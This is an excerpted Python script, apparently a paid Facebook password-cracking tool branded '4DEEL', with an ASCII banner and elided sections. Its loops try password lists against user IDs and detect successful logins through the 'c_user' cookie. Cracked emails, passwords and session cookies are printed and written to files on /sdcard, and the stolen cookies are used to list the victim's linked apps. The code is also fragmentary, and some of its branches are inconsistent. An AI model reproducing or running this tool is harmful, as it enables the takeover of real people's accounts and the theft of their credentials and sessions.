...
def FD():
    os.system('clear')
    print(logo)
    print('\x1b[1;33m [1] DOBRA TRY KRO')
    print(' [2] EXIT')
...
def cek_apk(session,coki):
    ...
    if len(game)==0:
        ...
        print(f'\r[4DEEL] %s \x1b[1;95m â˜† Your Active Apps â˜†     :{WHITE}'%(GREEN))
    ...
    if len(game)==0:
        ...
        print(f'\r[4DEEL] %s \x1b[1;95m â—‡ Your Expired Apps â—‡    :{WHITE}'%(M))
        for i in range(len(game)):
...
| \033[1;97m$$$$$$$/|  $$$$$$$|  $$$$$/$$$$/|  $$$$$$$| $$    |  $$$$$$$
|_______/  \_______/ \_____/\___/  \_______/|__/     \_______/
                                                              
└━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┘                                      
                                                              

\033[1;32m┌━━━━━━━━━━━━━━━━━ \033[1;97m4DEEL\33[0;m \033[1;32m━━━━━━━━━━━━━━━━━━┑
\033[1;32m┃   \033[1;32mCREATED BY\33[0;m   :  \033[1;32m4DEEL.CYBER            ┃
┃   \033[1;32mFACEBOK      : \033[1;32mSULMAN KBR              ┃
┃   \033[1;32mGITHUB       :  \033[1;32mNHI BTAOGA        ┃
┃   \033[1;32mTOOL STATUS  :  \033[1;32mPAID-NO_FRE            ┃
┃   \033[1;32mTEAM         :  \033[1;32mPRIVATE                 ┃
┃   \033[1;32mTOOL VIRSION :  \033[1;32m1.3                     ┃
┃   \033[1;32mTOOL WORK    :  \033[1;32mONLY FUCKER               ┃
└━━━━━━━━━━━━━━━━━ \033[1;97m4DEEL\33[0;m \033[1;32m━━━━━━━━━━━━━━━━━━┘
\033[1;37m┌━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┑
┃   ‌   \033[1;32mWELLCOME TO \033[1;37mLEGHARI TOL\33[0;m        ┃
\033[1;37m└━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┘\n""")
loop = 0
oks = []
cps = []
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\033[1;32m[•]---------------------[4DEEL-OK]--------------------[•]\nEMAIL : '+uid+'\nUID   : '+cid+'  '+ps+ '\n[•]---------------------------------------------------[•]')
                cek_apk(session,coki)
                open('/sdcard/4DEEL-OK.txt', 'a').write(uid+' | '+ps+'\n')
                oks.append(cid)
                break
                ...
                cid=coki[24:39]
                Red = '\033[1;31m'
                print('\033[1;31m[•]--------------------[4DEEL-CP]---------------------[•]\n  '+uid+' • '+ps+ '\n[•]------------------------------------------------[•]\033[1;97m')
                open('/sdcard/4DEEL-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
                ...
                open('/sdcard/4DEEL-2F.txt', 'a').write(uid+' | '+ps+'\n')
                twf.append(cid)
            else:
                continue
        loop+=1
        ...
        for ps in pwx:
           ...
           "user-agent": pro}
            ...
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print('  \033[1;32m(4DEEL-OK)  ' +uid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/4DEEL-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('  \33[1;30m(4DEEL-CP)  ' +uid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/4DEEL-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r  %s[4DEEL] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except requests.exceptions.ConnectionError:
        pass
